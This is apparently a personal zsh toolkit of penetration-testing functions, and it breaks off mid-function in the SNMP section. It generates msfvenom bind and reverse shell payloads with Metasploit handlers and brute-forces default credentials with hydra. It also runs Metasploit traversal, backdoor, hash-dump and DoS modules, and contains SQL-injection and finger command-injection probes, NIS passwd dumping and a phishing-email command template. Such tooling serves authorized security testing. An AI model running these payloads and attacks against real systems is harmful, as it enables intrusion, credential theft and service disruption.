#-------------------------NETWORK PENTESTING-------------------------#
# Interface Setting
chnic(){
    nic_lst=$(ifconfig | awk -F" " '{print $1}' | grep : | tr -d ':' | tr '\n' ', ')
    read -r nic\?"SELECT NIC (${nic_lst%?}): "
    export inter=$nic
    export ip=$(ifconfig $inter 2>/dev/null | awk -F" " '{print $2}' | sed -n '2 p')
}

# Start Ligolo Proxy
ligstart(){
    sudo ip tuntap add user `whoami` mode tun ligolo 2>/dev/null
    sudo ip link set ligolo up 2>/dev/null
    ~/TOOLS/ligolo-ng/dist/ligolo-ng-proxy-linux_amd64 -selfcert
}

# ICMP Probing
hping(){
    sudo hping3 --syn -s 53 -p $2 -c 3 $1
}

# Incoming ICMP from outside hosts
listenping(){
    chnic
    sudo tcpdump ip proto \\icmp -i $inter
}

# Netcat Listener
listen(){
    chnic
    sudo rlwrap -cAr nc -lvnp $1 -s $ip
}

# PyGPO Abuse Alias
alias pygpoabuse='/home/kali/TOOLS/pyGPOAbuse/venv/bin/python3 ~/TOOLS/pyGPOAbuse/pygpoabuse.py'

# MSF Listener / Binder Generator
metash(){
    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ ^lin* ]]; then
        read -r form\?"SELECT FORMAT (elf, elf-so): "
    fi
    if [[ $os =~ ^win* ]]; then
        read -r form\?"SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
    fi

    ext_form=$form
    if [[ $form == "ps1" ]]; then
        form="psh"
        ext_form="ps1"
    fi

    read -r type\?"SELECT STAGING: (staged / stageless): "
    read -r lis\?"SELECT CONNECTION (bind / reverse): "
    chnic
    read -r port\?"LISTENER PORT: "

    if [[ $os =~ ^lin* ]]; then
        if [[ $os == "lin32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi

            if [[ $type == "stageless" ]]; then 
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "lin64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
    fi

    if [[ $os =~ ^win* ]]; then
        if [[ $os == "win64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "win32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
    fi
}

# Server Opening Functions
collab(){
    interactsh-client -up && interactsh-client
}

smtpserv(){
    chnic
    echo -e "OPENING SMTP 'DebuggingServer' AT $ip:2525\n"
    python2 -m smtpd -n -c DebuggingServer $ip:2525
}

respond(){
    chnic
    sudo responder -I $inter
}

httpserv(){ 
    chnic
    echo -e "OPENING HTTP SERVER AT http://$ip:8888"
    python3 -m http.server 8888 >/dev/null
}

ftpserv(){
    chnic
    echo -e "OPENING FTP SERVER AT ftp://$ip:2121"
    python3 -m pyftpdlib -p 2121 -w >/dev/null
}

smbserv(){
    chnic
    echo -e "OPENING SMB SHARE AT \\\\$ip\\share"
    smbserver.py -ip $ip -smb2support share .
}

webdavserv(){
    chnic
    echo -e "\nOPENING WEBDAV AT http://$ip:8000\n FROM /tmp"
    wsgidav --host=$ip --port=8000 --root=/tmp --auth=anonymous
}

# Neo4J for Bloodhound usage
neostart(){
    sudo neo4j console
}

# TCP / UDP Port Scanners
tcp(){
    echo -e "\nTCP SCANNING (TOP 99%)\n"
    sudo nmap -sSCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 3328 -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1

    echo -e "\nTCP FULL BACKGROUND SCANNING\n"
    sudo nmap -sSCV -n -Pn --disable-arp-ping -g 53 -v -p- -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1
}

udp(){
    echo -e "\nUDP SERVICE SCANNING (TOP 100)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 100 -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1 -oX /tmp/$1_UDP.txt
    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 $1
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP SERVICE SCANNING (TOP 99%)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 15094 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1 -oX /tmp/$1_UDP.txt

    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 $1
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP FULL BACKGROUND SCANNING\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v -p- --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1
}

# Tracerouting
trace(){
    echo -e "---ICMP TRACING---"
    sudo traceroute -A -n -I $1
}

# Network Service Enumerator
scan(){
    if [[ $1 == "ftp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="ftp-* and not brute" -p$3 $2

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$2:$3

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            read -r resp\?"DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$2_FTP\"? (Y/N)"
            if [[ $resp =~ [Yy]$ ]]; then
                echo -e "\nDOWNLOADING FILES\n"
                mkdir ./$2_FTP && cd ./$2_FTP && wget --mirror --user="$usr" --password="$psw" --no-passive-ftp ftp://$2:$3
                cd ..
            fi
        fi

        echo -e "\nTRYING MSF TRAVERSAL ATTACKS\n"
        msfconsole -q -x "use auxiliary/scanner/ftp/konica_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/pcman_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "dns" ]]; then
        echo -e "\nNMAP BANNER / RECURSION CHECK\n"
        sudo nmap -Pn -sUV -n --script "(default and *dns*) or dns-nsid or fcrdns or dns-random-txid or dns-random-srcport" -p$3 $2

        read -r ad_resp\?"IS THE DNS SERVER HANDLING AN ACTIVE DIRECTORY? (Y/N): "

	    while true; do
        	read -r dnsdom\?"INPUT A DOMAIN TO ENUMERATE (CTRL-C TO EXIT): "
        	if [[ ! -z $dnsdom ]]; then
                    rm /tmp/ns_$dnsdom.txt /tmp/zones_$dnsdom.txt &>/dev/null
                    if [[ $ad_resp =~ [Yy] ]]; then
                        echo -e "\nCHECKING AD RECORDS WITH DIG\n"
                        dig -t _gc._tcp.lab.$dnsdom @$2 -p$3
                        dig -t _ldap._tcp.lab.$dnsdom @$2 -p$3
                        dig -t _kerberos._tcp.lab.$dnsdom @$2 -p$3
                        dig -t _kpasswd._tcp.lab.$dnsdom @$2 -p $3

                        echo -e "\nCHECKING NMAP SRV-ENUM RECORDS\n"
            		    sudo nmap -Pn -n -sUV -p$3 --script dns-srv-enum --script-args dns-srv-enum.domain=$dnsdom $2
                    fi

                    echo -e "\nREQUESTING \"NS\" RECORDS FOR \"$dnsdom\"\n"
                    ns_records=$(dig ns $dnsdom @$2 -p $3 +short) && echo $ns_records
                    ref_chk=$(dig ns $dnsdom @$2 -p $3 | grep REFUSED)

                    if [[ ! -z $ref_chk || -z $ns_records ]]; then
                        echo -e "\nREQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig a $dnsdom @$2 -p $3 +short
                        dig aaaa $dnsdom @$2 -p $3 +short

                        echo -e "\nREQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig mx $dnsdom @$2 -p $3 +short
                        dig txt $dnsdom @$2 -p $3 +short

                        echo -e "\nREQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig cname $dnsdom @$2 -p $3 +short

                        if [[ ! -z $ns_records ]]; then
                            echo -e "NS REQUEST WAS REFUSED, ATTEMPTING ZONE TRANSFER OVER DNS IP\n"
                            axfr_resp=$(dig axfr $dnsdom @$2 -p $3 | grep $dnsdom --color=never | tail -n +2)

                            if [[ -z $axfr_resp ]]; then
                                echo -e "\nZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                                echo $2 > /tmp/ns_$dnsdom.txt
                                cur=$(pwd) && cd ~/TOOLS/subbrute
                                python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                cd $cur
                            else
                                echo $axfr_resp
                            fi
                        fi
                    fi

                    if [[ ! -z $ns_records && -z $ref_chk ]]; then
                        echo $ns_records > /tmp/zones_$dnsdom.txt && touch /tmp/ns_$dnsdom.txt
                        while read zone; do
                            ip_chk=$(dig a ${zone%.} @$2 +short)
                            if [[ $ip_chk == "127.0.0.1" || -z $ip_chk ]]; then 
                                echo $2 >> /tmp/ns_$dnsdom.txt
                            else
                                echo $ip_chk >> /tmp/ns_$dnsdom.txt
                            fi
                        done < /tmp/zones_$dnsdom.txt
                        cat /tmp/ns_$dnsdom.txt | sort -u > /tmp/tmp_ns_$dnsdom.txt && mv /tmp/tmp_ns_$dnsdom.txt /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig a $dnsdom @$zone -p $3 +short
                            dig aaaa $dnsdom @$zone -p $3 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig mx $dnsdom @$zone -p $3 +short
                            dig txt $dnsdom @$zone -p $3 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig cname $dnsdom @$zone -p $3 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nATTEMPTING ZONE TRANSFER OVER ALL ZONES\n"
                        while read zone; do
                            axfr_resp=$(dig axfr $dnsdom @$zone -p $3 | grep $dnsdom --color=never | tail -n +2)
                            if [[ ! -z $axfr_resp ]]; then
                                echo $axfr_resp
                                break
                            fi
                        done < /tmp/ns_$dnsdom.txt
                        if [[ -z $axfr_resp ]]; then
                            echo -e "\nZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                            cur=$(pwd) && cd ~/TOOLS/subbrute
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                            cd $cur
                        fi
                    fi
        	fi
	    done

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "ssh" ]]; then
        echo -e "\nCHECKING VERSION + AUTH METHODS\n"
        sudo nmap -n -Pn -v -sV --script "ssh-auth-methods" --script-args="ssh.user=root" -p$3 $2

        echo -e "\nLAUNCHING SSH-AUDIT\n"
        ssh-audit --port $3 $2

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$2:$3

        echo -e "\nMSF ENUMERATION (XATO-TOP-1000)\n"
        msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set USER_FILE /usr/share/seclists/Usernames/xato_top_1000_custom.txt; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\nMSF BACKDOOR CHECKS\n"
        msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/fortinet_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/eaton_xpert_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "telnet" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "telnet-* and not brute" -p$3 $2

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://$2:$3

        echo -e "\nMSF BROCADE / TELNET ATTACKS\n"
        msfconsole -q -x "use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/satel_cmd_exec; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "vmware" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "http-vmware-path-vuln or vmware-version" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/vmware/esx_fingerprint; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/vmware/vmauthd_version; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/vmware/vmware_server_dir_trav; set RHOSTS $2; set RPORT $3; exploit; exit"     
        msfconsole -q -x "use auxiliary/scanner/vmware/vmware_update_manager_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "smtp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=smtp-commands,smtp-ntlm-info,smtp-strangeport,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p$3 $2

        echo -e "\nMSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r mtd\?"INPUT METHOD FOR USER BRUTEFORCING (BLANK TO SKIP): "
        read -r dom\?"INPUT A DOMAIN IF PRESENT: "
        if [[ ! -z $dom ]]; then
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $1 -p $2 -w 15 -D $dom
        else
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $1 -p $2 -w 15
        fi 

        echo -e "\nTESTING OPEN RELAYING\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $2; set RPORT 25; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\nSEND E-MAILS VIA -> swaks --server $2:$3 --to victim@[DOMAIN] --from evil@[DOMAIN] --header Subject: test --body [LINK] --attach [FILE]\"\n"
    fi

    if [[ $1 == "whois" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="whois-* and not brute" -p$3 $2

        echo -e "\nTESTING SQL INJECTION\n"
        whois -h $2 -p $3 "a') or 1=1#"

        read -r whois_dom\?"INPUT DOMAIN TO QUERY (BLANK TO SKIP): "
        if [[ ! -z $whois_dom ]]; then
            whois -h $2 -p $3 "$whois_dom"
        fi
    fi

    if [[ $1 == "psql" ]]; then
        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/postgres/postgres_dbname_flag_injection; set RHOST $2; set RPORT $3; run"

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$2:$3

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            user=$(echo $creds | cut -d":" -f1)
            password=$(echo $creds | cut -d":" -f2)

            echo -e "\nMSF HASH DUMPING\n"
            msfconsole -q -x "use auxiliary/scanner/postgres_hashdump; set USERNAME $user; set PASSWORD $password; set RHOSTS $2; set RPORT $3; exploit; exit"

            echo -e "\nATTEMPTING LOGIN\n"
            PGPASSWORD=$password psql -p $3 -h $2 -U $user
        fi
    fi

    if [[ $1 == "tftp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sUV --script="tftp-enum" -p$3 $2

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        msfconsole -q -x "use auxiliary/scanner/tftp/tftpbrute; set RHOST $2; set RPORT $3; set THREADS 10; run"

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/tftp/netdecision_tftp; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "finger" ]]; then
        echo -e "\nGRABBING ROOT BANNER\n"
        echo root | nc -vn $2 $3

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=finger -p$3 $2

        echo -e "\nTESTING \"/bin/id\" INJECTION\n"
        finger "|/bin/id@$2"

        echo -e "\nENUMERATING USERS (XATO-TOP-1000)\n"
        msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $2; set RPORT $3; set USERS_FILE /usr/share/seclists/Usernames/xato_top_1000_custom.txt; exploit; exit"
    fi

    if [[ $1 == "portmap" ]]; then
        echo -e "\nDISPLAYING RPC INFO -> CHECK IF NFS / RUSERS / YPBIND\n"
        rpcinfo $2

        echo -e "\nCHECKING USER LISTINGS\n"
        rusers -l $2

        echo -e "\nCHECKING NFS EXPORTS\n"
        showmount -e $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/portmap/portmap_amp; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r resp\?"INPUT A VALID NIS DOMAIN (BLANK TO SKIP): "
        if [[ ! -z $resp ]]; then
            echo -e "\nDUMPING INFORMATION\n"
            ypwhich -d $resp $2
            ypcat -d $resp -h $2 passwd.byname
            ypcat -d $resp -h $2 group.byname
            ypcat -d $resp -h $2 hosts.byname
            ypcat -d $resp -h $2 mail.aliases
        fi
    fi

    if [[ $1 == "pop3" ]]; then
        echo -e "\nBANNER GRABBING\n"
        echo "quit" | nc -vn $2 $3

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "pop3-* and not brute" -p$3 $2
    
        echo -e "\nMSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/pop3/pop3_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)
           
            echo -e "\nLISTING MESSAGES\n"
            curl -u "$usr:$psw" -s pop3://$2:$3

            while true; do read -r msg\?"INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$2:$3/$msg; done
        fi

    fi

    if [[ $1 == "nfs" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p$3 $2

        echo -e "\nSHOWMOUNTING CHECKS\n"
        showmount -e $2

        read -r shr\?"INPUT MOUNTABLE SHARE (BLANK TO SKIP): "
        if [[ ! -z $shr ]]; then
            echo -e "\nMOUNTING TO \"/mnt/$2_$shr\"\n"
            sudo mkdir /mnt/$2_$shr && sudo mount -t nfs $2:/$shr /mnt/$2_$shr -o nolock && cd /mnt/$2_$shr
        fi
    fi

    if [[ $1 == "ident" ]]; then
        read -r portlist\?"INPUT SPACE-SEPARATED OPEN PORTS: "

        echo -e "\nENUMERATING USERS OF SUPPLIED PORTS\n"
        ident-user-enum $2 $3 $portlist
    fi

    if [[ $1 == "ntp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -sUV -sV --script "ntp-info or ntp-monlist" -p$3 $2

        echo -e "\nREQUESTING METHODS\n"
        ntpq -c readlist $2
        ntpq -c readvar $2
        ntpq -c associations $2
        ntpq -c peers $2
        ntpd -c monlist $2
        ntpd -c listpeers $2
        ntpd -c sysinfo $2

        echo -e "\nMSF DOS CHECKS\n"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_peer_list_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_peer_list_sum_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_req_nonce_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_reslist_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_unsettrap_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "snmp" ]]; then 
        echo -e "\nFINGERPRINTING VERSION\n"
        sudo nmap -n -Pn -sUV --script "snmp-info" -p$3 $2

        read -r snmp_ver\?"INPUT SNMP VERSION (1, 2c, 3): "
        if [[ $snmp_ver == "3" ]]; then
